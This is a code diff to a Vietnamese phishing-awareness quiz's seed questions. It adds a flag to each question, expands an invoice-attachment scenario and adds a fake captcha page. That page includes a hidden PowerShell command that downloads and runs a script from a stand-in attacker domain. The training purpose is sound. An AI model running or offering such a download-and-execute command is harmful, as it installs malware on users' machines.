@@ -21,6 +21,7 @@ export const seedQuestions: QuizQuestion[] = [
       "Email dùng giọng điệu thúc ép, domain giả mạo và dẫn tới trang đăng nhập không thuộc Microsoft.",
     indicators: ["Giọng điệu khẩn cấp", "Tên miền giả mạo", "Liên kết đăng nhập đáng ngờ"],
     active: true,
+    alwaysIncluded: false,
     orderIndex: 1,
   },
   {
@@ -42,6 +43,7 @@ export const seedQuestions: QuizQuestion[] = [
       "Đây là kiểu phishing phổ biến qua SMS: tạo cảm giác gấp, thu phí nhỏ và dẫn tới website lookalike để lấy thẻ.",
     indicators: ["Phí phát sinh bất thường", "Domain lạ", "Ép thao tác nhanh"],
     active: true,
+    alwaysIncluded: false,
     orderIndex: 2,
   },
   {
@@ -53,7 +55,7 @@ export const seedQuestions: QuizQuestion[] = [
       "Hãy kiểm tra nội dung mô phỏng bên dưới và quyết định xem đây là phishing hay legitimate.",
     scenarioHtml: `
       <div class="portal-sim">
-        <div class="mail-row" data-spot="safe" data-label="Đúng domain nội bộ VPS"><strong>Trang đích:</strong> <a href="https://hr.vps.com.vn/policy/leave-2026" title="https://hr.vps.com.vn/policy/leave-2026">https://hr.vps.com.vn/policy/leave-2026</a></div>
+        <div class="mail-row" data-spot="safe" data-label="Đúng domain nội bộ VPS"><strong>Trang đích:</strong> <a href="https://hrm.vps.com.vn/policy/leave-2026" title="https://hrm.vps.com.vn/policy/leave-2026">https://hrm.vps.com.vn/policy/leave-2026</a></div>
         <p>Updated Leave Policy 2026</p>
         <button type="button">Acknowledge policy</button>
       </div>
@@ -63,6 +65,7 @@ export const seedQuestions: QuizQuestion[] = [
       "Ngữ cảnh phù hợp, domain đúng với hệ thống HR quen thuộc và không yêu cầu thông tin nhạy cảm.",
     indicators: ["Đúng bối cảnh", "Đúng domain nội bộ VPS", "Không yêu cầu nhập mật khẩu"],
     active: true,
+    alwaysIncluded: false,
     orderIndex: 3,
   },
   {
@@ -74,9 +77,27 @@ export const seedQuestions: QuizQuestion[] = [
       "Hãy quan sát email và file đính kèm được đề cập, rồi tự đánh giá mức độ an toàn của tình huống này.",
     scenarioHtml: `
       <div class="invoice-sim">
-        <p data-spot="danger" data-label="File ZIP từ nguồn lạ"><strong>Invoice Attached:</strong> <a href="/assets/files/Invoice_Overdue_2026.zip" download>Invoice_Overdue_2026.zip</a></p>
-        <p data-spot="danger" data-label="File macro đáng ngờ"><strong>Alternative file:</strong> <a href="/assets/files/Payment-Remittance.docm" download>Payment-Remittance.docm</a></p>
-        <p>Open the attachment today to avoid service interruption.</p>
+        <div class="mail-row" data-spot="danger" data-label="Người gửi không thuộc nhà cung cấp quen thuộc"><strong>From:</strong> Billing Team &lt;billing@vendor-payment-alert.net&gt;</div>
+        <div class="mail-row"><strong>Subject:</strong> Overdue invoice - immediate payment required</div>
+        <p>We could not verify your last payment. Open the attached documents today to avoid service interruption.</p>
+        <div class="attachment-list">
+          <div class="attachment-card" data-spot="danger" data-label="File ZIP từ nguồn lạ có thể chứa mã độc">
+            <span class="file-icon file-icon-danger">ZIP</span>
+            <div>
+              <strong>Invoice_Overdue_2026.zip</strong>
+              <span>Compressed archive - 189 KB</span>
+            </div>
+            <a href="/assets/files/Invoice_Overdue_2026.zip" download>Download</a>
+          </div>
+          <div class="attachment-card" data-spot="danger" data-label="File Office macro .docm là định dạng rủi ro cao">
+            <span class="file-icon file-icon-danger">DOCM</span>
+            <div>
+              <strong>Payment-Remittance.docm</strong>
+              <span>Macro-enabled document - 54 KB</span>
+            </div>
+            <a href="/assets/files/Payment-Remittance.docm" download>Download</a>
+          </div>
+        </div>
       </div>
     `,
     correctAnswer: "phishing",
@@ -84,6 +105,7 @@ export const seedQuestions: QuizQuestion[] = [
       "File nén từ nguồn không rõ ràng là dấu hiệu nguy hiểm, thường được dùng để phát tán malware hoặc tài liệu độc hại.",
     indicators: ["Nhà cung cấp không quen", "File ZIP đáng ngờ", "Dọa gián đoạn dịch vụ"],
     active: true,
+    alwaysIncluded: false,
     orderIndex: 4,
   },
   {
@@ -109,6 +131,7 @@ export const seedQuestions: QuizQuestion[] = [
       "Ngân hàng không yêu cầu nhập đầy đủ PIN hay OTP qua email. Đây là hành vi thu thập thông tin xác thực.",
     indicators: ["Yêu cầu dữ liệu nhạy cảm", "Biểu mẫu thu thập thông tin", "Tạo tâm lý lo sợ"],
     active: true,
+    alwaysIncluded: false,
     orderIndex: 5,
   },
   {
@@ -130,6 +153,7 @@ export const seedQuestions: QuizQuestion[] = [
       "Đây có thể là MFA fatigue: kẻ tấn công đã có mật khẩu và đang spam thông báo để bạn bấm nhầm chấp nhận.",
     indicators: ["Yêu cầu bất ngờ", "Lặp lại nhiều lần", "Thời điểm bất thường"],
     active: true,
+    alwaysIncluded: false,
     orderIndex: 6,
   },
   {
@@ -151,6 +175,7 @@ export const seedQuestions: QuizQuestion[] = [
       "Người gửi, nhịp họp và nền tảng họp đều trùng với hành vi nội bộ bình thường nên đây là trường hợp hợp lệ.",
     indicators: ["Người gửi quen thuộc", "Đúng lịch họp", "Link đúng hệ thống VPS"],
     active: true,
+    alwaysIncluded: false,
     orderIndex: 7,
   },
   {
@@ -172,6 +197,7 @@ export const seedQuestions: QuizQuestion[] = [
       "QR phishing che giấu đích đến thực sự cho tới khi người dùng quét. Domain đăng nhập không thuộc tổ chức là dấu hiệu đỏ rõ ràng.",
     indicators: ["Đích QR không rõ", "Yêu cầu đăng nhập", "Domain ngoài VPS"],
     active: true,
+    alwaysIncluded: false,
     orderIndex: 8,
   },
   {
@@ -192,6 +218,7 @@ export const seedQuestions: QuizQuestion[] = [
       "Quy trình, hệ thống và thương hiệu đều nhất quán với môi trường làm việc bình thường nên đây là trường hợp hợp lệ.",
     indicators: ["Đúng quy trình", "Đúng nền tảng", "Không có yêu cầu bất thường"],
     active: true,
+    alwaysIncluded: false,
     orderIndex: 9,
   },
   {
@@ -214,6 +241,7 @@ export const seedQuestions: QuizQuestion[] = [
       "Đây là kiểu lừa đảo BEC điển hình: lợi dụng quyền lực, yêu cầu gấp, giữ bí mật và né quy trình phê duyệt bình thường.",
     indicators: ["Gây áp lực từ cấp cao", "Yêu cầu giữ bí mật", "Đề nghị thanh toán bất thường"],
     active: true,
+    alwaysIncluded: false,
     orderIndex: 10,
   },
   {
@@ -236,6 +264,7 @@ export const seedQuestions: QuizQuestion[] = [
       "Ảnh cho thấy website dùng domain giả mạo có ký tự số thay cho chữ cái. Dù giao diện giống Microsoft, URL không hợp lệ.",
     indicators: ["Domain lookalike", "Bắt chước thương hiệu", "Trang đăng nhập nhái"],
     active: true,
+    alwaysIncluded: false,
     orderIndex: 11,
   },
   {
@@ -257,6 +286,7 @@ export const seedQuestions: QuizQuestion[] = [
       "Ưu đãi bất thường đi kèm giới hạn thời gian ngắn và domain không phải nhà mạng chính thức là dấu hiệu phishing.",
     indicators: ["Khuyến mãi quá tốt", "Giới hạn thời gian", "Domain không chính thức"],
     active: true,
+    alwaysIncluded: false,
     orderIndex: 12,
   },
   {
@@ -277,6 +307,7 @@ export const seedQuestions: QuizQuestion[] = [
       "Tin nhắn đến đúng thời điểm bạn đang đăng nhập, không chứa link, không yêu cầu bấm vào đâu và nội dung phù hợp với OTP thông thường.",
     indicators: ["Đúng thời điểm", "Không có link", "Nội dung OTP chuẩn"],
     active: true,
+    alwaysIncluded: false,
     orderIndex: 13,
   },
   {
@@ -299,6 +330,7 @@ export const seedQuestions: QuizQuestion[] = [
       "Poster có thể trông chuyên nghiệp nhưng đường dẫn đích là domain ngoài, không thuộc hệ thống nhân sự hay intranet công ty.",
     indicators: ["Domain lạ", "Mã QR che giấu đích đến", "Dụ người dùng đăng nhập"],
     active: true,
+    alwaysIncluded: false,
     orderIndex: 14,
   },
   {
@@ -321,6 +353,7 @@ export const seedQuestions: QuizQuestion[] = [
       "Email có thể hiển thị đúng người gửi @vps.com.vn, nhưng vẫn có khả năng email bị lạm dụng, bị chiếm quyền hoặc bị giả mạo phần hiển thị. Trong tình huống này, liên kết dẫn tới domain ngoài không phải vps.com.vn nên đây là dấu hiệu phishing rõ ràng.",
     indicators: ["Sender có vẻ hợp lệ nhưng có thể bị lạm dụng", "Link ngoài domain", "Thúc giục cập nhật gấp"],
     active: true,
+    alwaysIncluded: false,
     orderIndex: 15,
   },
   {
@@ -342,6 +375,7 @@ export const seedQuestions: QuizQuestion[] = [
       "SMS dùng áp lực thời gian và domain dài, lạ, chèn chuỗi vps-com-vn để tạo cảm giác giống trang thật.",
     indicators: ["Thúc giục trong 30 phút", "Domain giả mạo", "Yêu cầu xác minh qua link SMS"],
     active: true,
+    alwaysIncluded: false,
     orderIndex: 16,
   },
   {
@@ -364,6 +398,7 @@ export const seedQuestions: QuizQuestion[] = [
       "Domain người gửi và link đều không phải vps.com.vn. Nội dung đánh vào tâm lý sợ mất tiền để thúc đẩy người dùng bấm link.",
     indicators: ["Domain lookalike", "Tâm lý sợ mất tiền", "Link hủy lệnh giả mạo"],
     active: true,
+    alwaysIncluded: false,
     orderIndex: 17,
   },
   {
@@ -386,6 +421,7 @@ export const seedQuestions: QuizQuestion[] = [
       "Email đến từ domain chính thức, chỉ thông báo lịch bảo trì và không yêu cầu nhập mật khẩu, OTP hay thông tin nhạy cảm.",
     indicators: ["Domain chính thức", "Không yêu cầu đăng nhập", "Không tạo áp lực thao tác"],
     active: true,
+    alwaysIncluded: false,
     orderIndex: 18,
   },
   {
@@ -408,6 +444,7 @@ export const seedQuestions: QuizQuestion[] = [
       "Đây là kịch bản phishing qua SMS: dùng quà tặng, thời hạn ngắn và domain lạ để dẫn người dùng tới trang giả mạo.",
     indicators: ["Quà tặng bất thường", "Thời hạn ngắn", "Domain .top đáng ngờ"],
     active: true,
+    alwaysIncluded: false,
     orderIndex: 19,
   },
   {
@@ -430,6 +467,7 @@ export const seedQuestions: QuizQuestion[] = [
       "Người gửi có thể hiển thị đúng @vps.com.vn, nhưng email vẫn có thể bị lạm dụng, bị chiếm quyền hoặc bị giả mạo phần hiển thị. Link xác minh không thuộc vps.com.vn nên không nên đăng nhập qua liên kết trong email.",
     indicators: ["Sender hợp lệ nhưng có thể bị lạm dụng", "Cảnh báo bảo mật tạo lo lắng", "Text link và hyperlink thật không khớp"],
     active: true,
+    alwaysIncluded: false,
     orderIndex: 20,
   },
   {
@@ -454,6 +492,7 @@ export const seedQuestions: QuizQuestion[] = [
       "Trang bắt chước giao diện đăng nhập VPS nhưng domain không phải vps.com.vn. Đăng nhập tại đây có thể làm lộ thông tin tài khoản.",
     indicators: ["Domain không hợp lệ", "Biểu mẫu đăng nhập giả", "Nguồn link từ nhóm chat"],
     active: true,
+    alwaysIncluded: false,
     orderIndex: 21,
   },
   {
@@ -476,6 +515,7 @@ export const seedQuestions: QuizQuestion[] = [
       "Email đúng domain, nội dung chỉ nhắc lịch sự kiện và link trỏ về website chính thức. Không có yêu cầu mật khẩu hay OTP.",
     indicators: ["Đúng domain", "Không yêu cầu đăng nhập", "Đúng bối cảnh sự kiện"],
     active: true,
+    alwaysIncluded: false,
     orderIndex: 22,
   },
   {
@@ -498,6 +538,7 @@ export const seedQuestions: QuizQuestion[] = [
       "Email đánh vào lợi ích tài chính và thời hạn ngắn. Domain người gửi và link đều không phải VPS chính thức.",
     indicators: ["Lời hứa tài chính", "Thời hạn gấp", "Domain người gửi và link đáng ngờ"],
     active: true,
+    alwaysIncluded: false,
     orderIndex: 23,
   },
   {
@@ -519,6 +560,7 @@ export const seedQuestions: QuizQuestion[] = [
       "OTP không được nhập vào website lạ qua link SMS. Kẻ tấn công có thể dùng nội dung hủy lệnh để lừa người dùng tiết lộ mã xác thực.",
     indicators: ["Yêu cầu nhập OTP", "Link SMS giả mạo", "Dùng nỗi sợ giao dịch bất thường"],
     active: true,
+    alwaysIncluded: false,
     orderIndex: 24,
   },
   {
@@ -543,6 +585,7 @@ export const seedQuestions: QuizQuestion[] = [
       "Đây là kiểu hyperlink ẩn: dòng chữ hiển thị giống domain hợp lệ nhưng đường dẫn thật bên dưới lại trỏ tới domain phishing. Email đúng domain cũng có thể bị lạm dụng hoặc bị giả mạo phần hiển thị, vì vậy cần kiểm tra link thực tế trước khi bấm.",
     indicators: ["Text link và href không khớp", "Link ẩn trỏ tới domain ngoài", "Sender có thể bị lạm dụng"],
     active: true,
+    alwaysIncluded: false,
     orderIndex: 25,
   },
   {
@@ -567,6 +610,7 @@ export const seedQuestions: QuizQuestion[] = [
       "Kẻ tấn công thường đặt text link giống domain VPS để tạo cảm giác an toàn, nhưng href thật lại dẫn tới trang ngoài. Cần hover hoặc kiểm tra URL đích trước khi đăng nhập.",
     indicators: ["Hyperlink ẩn không khớp text", "Chủ đề lương nhạy cảm", "Người gửi ngoài hệ thống"],
     active: true,
+    alwaysIncluded: false,
     orderIndex: 26,
   },
   {
@@ -591,6 +635,7 @@ export const seedQuestions: QuizQuestion[] = [
       "Đây là trường hợp hợp lệ: người gửi, text hiển thị và URL thật đều thuộc hệ thống nội bộ VPS; nội dung không yêu cầu thông tin nhạy cảm.",
     indicators: ["Text link khớp href", "Đúng domain nội bộ VPS", "Không yêu cầu thông tin nhạy cảm"],
     active: true,
+    alwaysIncluded: false,
     orderIndex: 27,
   },
   {
@@ -623,6 +668,7 @@ export const seedQuestions: QuizQuestion[] = [
       "SMS giả mạo thường dùng thông báo giao dịch lớn để tạo hoảng sợ, sau đó dụ người dùng bấm link và nhập OTP. Không nhập OTP hoặc thông tin ngân hàng qua link trong SMS.",
     indicators: ["Tạo hoảng sợ", "Link hủy giao dịch giả", "Có nguy cơ thu thập OTP"],
     active: true,
+    alwaysIncluded: false,
     orderIndex: 28,
   },
   {
@@ -655,6 +701,7 @@ export const seedQuestions: QuizQuestion[] = [
       "Tin nhắn dùng áp lực khóa tài khoản và link có chữ VPS để tạo tin tưởng, nhưng domain không thuộc vps.com.vn. Không đăng nhập tài khoản chứng khoán qua link SMS lạ.",
     indicators: ["Thúc giục khóa tài khoản", "Domain giả mạo VPS", "Link đăng nhập trong SMS"],
     active: true,
+    alwaysIncluded: false,
     orderIndex: 29,
   },
   {
@@ -686,6 +733,39 @@ export const seedQuestions: QuizQuestion[] = [
       "Tin nhắn chỉ thông báo trạng thái giao hàng, không có link, không yêu cầu thanh toán thêm và không yêu cầu OTP nên phù hợp với SMS hợp lệ.",
     indicators: ["Không có link", "Không yêu cầu OTP", "Nội dung đúng bối cảnh đặt hàng"],
     active: true,
+    alwaysIncluded: false,
     orderIndex: 30,
   },
+  {
+    id: "q31",
+    title: "Website yêu cầu xác minh Captcha bằng lệnh",
+    category: "Website",
+    scenarioIntro: "Bạn truy cập một website thông báo cần xác minh Captcha trước khi tiếp tục.",
+    scenarioContent:
+      "Hãy kiểm tra cách website yêu cầu xác minh và quyết định đây là phishing hay legitimate.",
+    scenarioHtml: `
+      <div class="portal-sim">
+        <div class="mail-row" data-spot="danger" data-label="Domain xác minh không thuộc hệ thống VPS"><strong>URL:</strong> <a href="https://vps-captcha-verify.com/check" title="https://vps-captcha-verify.com/check">https://vps-captcha-verify.com/check</a></div>
+        <div class="captcha-verify">
+          <h4>Security verification required</h4>
+          <p data-spot="danger" data-label="Captcha hợp lệ không yêu cầu người dùng mở Run/Terminal hoặc dán lệnh hệ thống">To prove you are human, complete the verification on your computer.</p>
+          <ul class="captcha-steps">
+            <li data-spot="danger" data-label="Yêu cầu bấm Windows + R là hành vi rất bất thường với Captcha">Press <strong>Windows + R</strong></li>
+            <li data-spot="danger" data-label="Yêu cầu Ctrl + V để dán lệnh là dấu hiệu phát tán mã độc">Press <strong>Ctrl + V</strong> to paste the verification code</li>
+            <li>Press Enter to finish verification</li>
+          </ul>
+          <code class="captcha-command" data-spot="danger" data-label="Lệnh PowerShell tải và chạy mã từ Internet có nguy cơ cài mã độc">powershell -w hidden -c "iwr https://vps-captcha-verify.com/update.ps1 | iex"</code>
+          <button type="button" data-spot="danger" data-label="Nút copy lệnh hệ thống không phải hành vi Captcha bình thường">Copy verification command</button>
+        </div>
+      </div>
+    `,
+    correctAnswer: "phishing",
+    explanation:
+      "Captcha thật không yêu cầu người dùng mở hộp thoại Run, Terminal hay dán lệnh PowerShell. Đây là kỹ thuật lừa người dùng tự chạy mã độc trên máy.",
+    indicators: ["Captcha yêu cầu chạy lệnh", "Domain không thuộc VPS", "PowerShell tải mã từ Internet"],
+    active: true,
+    alwaysIncluded: false,
+    orderIndex: 31,
+  },
 ];
+
